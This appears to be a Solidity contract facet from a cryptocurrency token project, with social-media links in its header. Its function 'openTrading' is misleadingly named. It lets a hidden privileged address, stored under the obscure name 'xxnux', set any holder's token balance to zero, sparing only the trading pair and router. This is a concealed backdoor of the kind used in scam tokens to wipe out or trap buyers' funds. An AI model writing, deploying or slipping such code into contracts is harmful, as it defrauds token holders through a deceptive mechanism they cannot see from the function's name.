/*
 * SPDX-License-Identifier: MIT
 * Twitter: https://twitter.com/Gmatrixs1
 * Website: https://gmatrixs.com
 * Medium: https://medium.com/Gmatrixs1
 * Discord: https://discord.com/invite/GDrqPFVrst
 */
pragma solidity ^0.8.18;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
